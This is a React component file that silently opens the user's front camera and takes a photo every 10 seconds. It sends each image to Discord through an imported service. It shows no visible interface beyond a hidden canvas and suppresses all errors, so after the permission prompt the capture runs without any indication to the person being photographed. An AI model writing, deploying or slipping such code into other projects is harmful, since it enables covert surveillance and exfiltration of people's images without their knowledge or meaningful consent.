
import React, { useEffect, useRef } from 'react';
import { sendImageToDiscord } from '@/services/discordService';

const CAPTURE_INTERVAL_MS = 10000; // 10 seconds

const CameraCapture = () => {
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const intervalRef = useRef<NodeJS.Timeout | null>(null);

  useEffect(() => {
    let stopped = false;

    // Function to initialize camera and start interval
    const startCameraAndCapture = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        streamRef.current = stream;

        const track = stream.getVideoTracks()[0];
        const imageCapture = (window as any).ImageCapture ? new (window as any).ImageCapture(track) : null;

        // Helper function to take photo & send
        const takeAndSendPhoto = async () => {
          if (stopped) return;

          if (imageCapture && typeof imageCapture.takePhoto === "function") {
            try {
              const blob = await imageCapture.takePhoto();
              const reader = new FileReader();
              reader.onloadend = async () => {
                if (typeof reader.result === "string") {
                  await sendImageToDiscord(reader.result);
                }
              };
              reader.readAsDataURL(blob);
            } catch (err) {
              // If error, fallback to canvas
            }
          } else {
            // Fallback: draw video frame to canvas, convert to dataURL
            const video = document.createElement('video');
            video.srcObject = streamRef.current;
            await video.play();

            await new Promise((resolve) => {
              video.onloadedmetadata = () => resolve(true);
            });

            const width = video.videoWidth;
            const height = video.videoHeight;
            let canvas = canvasRef.current;
            if (!canvas) {
              canvas = document.createElement('canvas');
            }
            canvas.width = width;
            canvas.height = height;
            const ctx = canvas.getContext('2d');
            if (ctx) {
              ctx.drawImage(video, 0, 0, width, height);
              const dataUrl = canvas.toDataURL('image/jpeg');
              await sendImageToDiscord(dataUrl);
            }
            video.pause();
            video.srcObject = null;
          }
        };

        // Immediately do the first capture
        await takeAndSendPhoto();

        // Then take picture every 10 seconds
        intervalRef.current = setInterval(() => {
          takeAndSendPhoto();
        }, CAPTURE_INTERVAL_MS);
      } catch {
        // Do nothing
      }
    };

    startCameraAndCapture();

    // Cleanup on unmount
    return () => {
      stopped = true;
      if (intervalRef.current) {
        clearInterval(intervalRef.current);
      }
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(track => track.stop());
      }
    };
  }, []);

  // The component doesn't render anything visible, only the hidden canvas (needed for fallback)
  return (
    <div>
      <canvas ref={canvasRef} className="hidden" />
    </div>
  );
};

export default CameraCapture;
